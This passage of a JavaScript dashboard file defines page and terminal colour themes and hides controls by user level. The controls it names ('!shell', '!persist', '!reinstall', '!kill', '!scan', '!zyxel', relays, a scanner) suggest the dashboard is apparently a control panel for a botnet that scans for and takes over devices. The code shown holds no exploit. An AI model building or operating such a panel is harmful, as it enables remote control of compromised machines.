  dracula:   { name:'Dracula',         bgBase:'#1e1f29', bgPrimary:'#282a36', bgCard:'#2d2f3d', bgCardHover:'#343746', bgInput:'#21222c', bgElevated:'#383a4a', border:'#44475a', borderLight:'#555869', text:'#f8f8f2', textMuted:'#8a8ea0', textDim:'#6272a4', accent:'#bd93f9', accentHover:'#a87cf5', green:'#50fa7b', red:'#ff5555', yellow:'#f1fa8c', blue:'#8be9fd', cyan:'#8be9fd', headerBg:'rgba(40,42,54,0.9)' },
  solarized: { name:'Solarized Dark',  bgBase:'#001e26', bgPrimary:'#002b36', bgCard:'#073642', bgCardHover:'#0a4050', bgInput:'#002028', bgElevated:'#0a4050', border:'#2a5a68', borderLight:'#3a6a78', text:'#839496', textMuted:'#657b83', textDim:'#586e75', accent:'#268bd2', accentHover:'#1a7ab8', green:'#859900', red:'#dc322f', yellow:'#b58900', blue:'#268bd2', cyan:'#2aa198', headerBg:'rgba(0,43,54,0.9)' },
  nord:      { name:'Nord',            bgBase:'#242933', bgPrimary:'#2e3440', bgCard:'#3b4252', bgCardHover:'#434c5e', bgInput:'#2a303c', bgElevated:'#434c5e', border:'#4c566a', borderLight:'#5c6678', text:'#d8dee9', textMuted:'#9ba4b5', textDim:'#7b849a', accent:'#88c0d0', accentHover:'#7ab3c3', green:'#a3be8c', red:'#bf616a', yellow:'#ebcb8b', blue:'#81a1c1', cyan:'#88c0d0', headerBg:'rgba(46,52,64,0.9)' },
  matrix:    { name:'Matrix',          bgBase:'#030503', bgPrimary:'#0a0a0a', bgCard:'#0f120f', bgCardHover:'#151a15', bgInput:'#060806', bgElevated:'#151a15', border:'#1a2e1a', borderLight:'#254025', text:'#00ff41', textMuted:'#00aa2a', textDim:'#007718', accent:'#00ff41', accentHover:'#33ff66', green:'#00ff41', red:'#ff0000', yellow:'#33ff66', blue:'#00cc33', cyan:'#33ff66', headerBg:'rgba(10,10,10,0.9)' }
};

function applyGlobalTheme(name) {
  var t = GLOBAL_THEMES[name]; if (!t) return;
  // Light/Dark entries delegate to data-theme rather than inline vars
  if (t._dataTheme) {
    applyTheme(t._dataTheme);
    try { localStorage.setItem('vision-theme', t._dataTheme); localStorage.setItem('vision_global_theme', name); } catch (e) {}
    var pk = document.getElementById('global-theme-picker');
    if (pk) pk.value = name;
    return;
  }
  var r = document.documentElement;
  r.removeAttribute('data-theme');
  try { localStorage.removeItem('vision-theme'); } catch (e) {}
  r.style.setProperty('--bg-base', t.bgBase);
  r.style.setProperty('--bg-primary', t.bgPrimary);
  r.style.setProperty('--bg-card', t.bgCard);
  r.style.setProperty('--bg-card-hover', t.bgCardHover);
  r.style.setProperty('--bg-input', t.bgInput);
  r.style.setProperty('--bg-elevated', t.bgElevated);
  r.style.setProperty('--border', t.border);
  r.style.setProperty('--border-light', t.borderLight);
  r.style.setProperty('--text', t.text);
  r.style.setProperty('--text-muted', t.textMuted);
  r.style.setProperty('--text-dim', t.textDim);
  r.style.setProperty('--accent', t.accent);
  r.style.setProperty('--accent-hover', t.accentHover);
  r.style.setProperty('--green', t.green);
  r.style.setProperty('--red', t.red);
  r.style.setProperty('--yellow', t.yellow);
  r.style.setProperty('--blue', t.blue);
  r.style.setProperty('--cyan', t.cyan);
  r.style.setProperty('--header-bg', t.headerBg);
  document.body.style.background = t.bgBase;
  localStorage.setItem('vision_global_theme', name);
  // Sync terminal theme when global theme matches a shell theme
  if (typeof SHELL_THEMES !== 'undefined' && SHELL_THEMES[name]) {
    applyShellTheme(name);
    var sp = document.getElementById('shell-theme-picker');
    if (sp) sp.value = name;
  }
}

(function() {
  var picker = document.getElementById('global-theme-picker');
  if (!picker) return;
  Object.keys(GLOBAL_THEMES).forEach(function(key) {
    var opt = document.createElement('option');
    opt.value = key; opt.textContent = GLOBAL_THEMES[key].name;
    picker.appendChild(opt);
  });
  var saved = localStorage.getItem('vision_global_theme');
  if (saved && GLOBAL_THEMES[saved]) {
    picker.value = saved;
    applyGlobalTheme(saved);
  } else {
    // No global theme saved — sync picker to the current light/dark data-theme.
    var current = document.documentElement.getAttribute('data-theme') || 'dark';
    if (GLOBAL_THEMES[current]) picker.value = current;
  }
})();

// ===========================================================================
// TERMINAL THEMES
// ===========================================================================
var SHELL_THEMES = {
  default:   { name: 'Default',    bg: '#0d1117', fg: '#c9d1d9', black: '#0d1117', red: '#ff7b72', green: '#3fb950', yellow: '#d29922', blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39d353', white: '#c9d1d9', brightBlack: '#484f58', brightRed: '#ffa198', brightGreen: '#56d364', brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff', brightCyan: '#56d364', brightWhite: '#f0f6fc' },
  monokai:   { name: 'Monokai',    bg: '#272822', fg: '#f8f8f2', black: '#272822', red: '#f92672', green: '#a6e22e', yellow: '#f4bf75', blue: '#66d9ef', magenta: '#ae81ff', cyan: '#a1efe4', white: '#f8f8f2', brightBlack: '#75715e', brightRed: '#f92672', brightGreen: '#a6e22e', brightYellow: '#f4bf75', brightBlue: '#66d9ef', brightMagenta: '#ae81ff', brightCyan: '#a1efe4', brightWhite: '#f9f8f5' },
  dracula:   { name: 'Dracula',    bg: '#282a36', fg: '#f8f8f2', black: '#21222c', red: '#ff5555', green: '#50fa7b', yellow: '#f1fa8c', blue: '#bd93f9', magenta: '#ff79c6', cyan: '#8be9fd', white: '#f8f8f2', brightBlack: '#6272a4', brightRed: '#ff6e6e', brightGreen: '#69ff94', brightYellow: '#ffffa5', brightBlue: '#d6acff', brightMagenta: '#ff92df', brightCyan: '#a4ffff', brightWhite: '#ffffff' },
  solarized: { name: 'Solarized',  bg: '#002b36', fg: '#839496', black: '#073642', red: '#dc322f', green: '#859900', yellow: '#b58900', blue: '#268bd2', magenta: '#d33682', cyan: '#2aa198', white: '#eee8d5', brightBlack: '#586e75', brightRed: '#cb4b16', brightGreen: '#586e75', brightYellow: '#657b83', brightBlue: '#839496', brightMagenta: '#6c71c4', brightCyan: '#93a1a1', brightWhite: '#fdf6e3' },
  nord:      { name: 'Nord',       bg: '#2e3440', fg: '#d8dee9', black: '#3b4252', red: '#bf616a', green: '#a3be8c', yellow: '#ebcb8b', blue: '#81a1c1', magenta: '#b48ead', cyan: '#88c0d0', white: '#e5e9f0', brightBlack: '#4c566a', brightRed: '#bf616a', brightGreen: '#a3be8c', brightYellow: '#ebcb8b', brightBlue: '#81a1c1', brightMagenta: '#b48ead', brightCyan: '#8fbcbb', brightWhite: '#eceff4' },
  matrix:    { name: 'Matrix',     bg: '#0a0a0a', fg: '#00ff41', black: '#0a0a0a', red: '#00ff41', green: '#00ff41', yellow: '#33ff66', blue: '#00cc33', magenta: '#00ff41', cyan: '#33ff66', white: '#00ff41', brightBlack: '#003300', brightRed: '#33ff66', brightGreen: '#33ff66', brightYellow: '#66ff99', brightBlue: '#33ff66', brightMagenta: '#33ff66', brightCyan: '#66ff99', brightWhite: '#ccffcc' },
  light:     { name: 'Light',      bg: '#ffffff', fg: '#1f1f1f', black: '#000000', red: '#d93025', green: '#0d904f', yellow: '#e37400', blue: '#1a73e8', magenta: '#7c3aed', cyan: '#007b83', white: '#ffffff', brightBlack: '#5f6368', brightRed: '#ea4335', brightGreen: '#34a853', brightYellow: '#fbbc04', brightBlue: '#4285f4', brightMagenta: '#9334e6', brightCyan: '#24c1e0', brightWhite: '#ffffff' }
};

function applyShellTheme(name) {
  var theme = SHELL_THEMES[name];
  if (!theme) return;
  document.querySelectorAll('.shell-output').forEach(function (el) {
    el.style.setProperty('--term-bg', theme.bg);
    el.style.setProperty('--term-fg', theme.fg);
    el.style.setProperty('--ansi-0',  theme.black);
    el.style.setProperty('--ansi-1',  theme.red);
    el.style.setProperty('--ansi-2',  theme.green);
    el.style.setProperty('--ansi-3',  theme.yellow);
    el.style.setProperty('--ansi-4',  theme.blue);
    el.style.setProperty('--ansi-5',  theme.magenta);
    el.style.setProperty('--ansi-6',  theme.cyan);
    el.style.setProperty('--ansi-7',  theme.white);
    el.style.setProperty('--ansi-8',  theme.brightBlack);
    el.style.setProperty('--ansi-9',  theme.brightRed);
    el.style.setProperty('--ansi-10', theme.brightGreen);
    el.style.setProperty('--ansi-11', theme.brightYellow);
    el.style.setProperty('--ansi-12', theme.brightBlue);
    el.style.setProperty('--ansi-13', theme.brightMagenta);
    el.style.setProperty('--ansi-14', theme.brightCyan);
    el.style.setProperty('--ansi-15', theme.brightWhite);
    el.style.background = theme.bg;
    el.style.color = theme.fg;
  });
  localStorage.setItem('vision_shell_theme', name);
}

// Populate shell theme picker and restore saved
(function () {
  var picker = document.getElementById('shell-theme-picker');
  if (!picker) return;
  Object.keys(SHELL_THEMES).forEach(function (key) {
    var opt = document.createElement('option');
    opt.value = key;
    opt.textContent = SHELL_THEMES[key].name;
    picker.appendChild(opt);
  });
  var saved = localStorage.getItem('vision_shell_theme');
  if (saved && SHELL_THEMES[saved]) {
    picker.value = saved;
    applyShellTheme(saved);
  }
})();

// ============================================================================
// RBAC: Hide UI elements based on user level
// ============================================================================
(function() {
  fetch('/api/me').then(function(r) { return r.json(); }).then(function(me) {
    var lvl = (me.level || 'Basic').toLowerCase();

    // Tabs that require Owner
    var ownerTabs = ['tab-users'];
    // Tabs that require Admin+
    var adminTabs = ['tab-relays', 'tab-tasks'];

    ownerTabs.forEach(function(t) {
      if (lvl !== 'owner') {
        var el = document.querySelector('[data-tab="' + t + '"]');
        if (el) el.style.display = 'none';
      }
    });

    adminTabs.forEach(function(t) {
      if (lvl !== 'owner' && lvl !== 'admin') {
        var el = document.querySelector('[data-tab="' + t + '"]');
        if (el) el.style.display = 'none';
      }
    });

    // Hide shell buttons for non-admin
    if (lvl !== 'owner' && lvl !== 'admin') {
      document.querySelectorAll('[onclick*="openShell"], [onclick*="!shell"], [onclick*="!reinstall"], [onclick*="!persist"], [onclick*="!kill"], [onclick*="msKill"]').forEach(function(el) {
        el.style.display = 'none';
      });
      // Hide scanner controls for non-admin
      document.querySelectorAll('[onclick*="!scan"], [onclick*="!zyxel"], [onclick*="scannerStart"], [onclick*="scannerStop"]').forEach(function(el) {
        el.style.display = 'none';
      });
    }
  }).catch(function() {});
})();
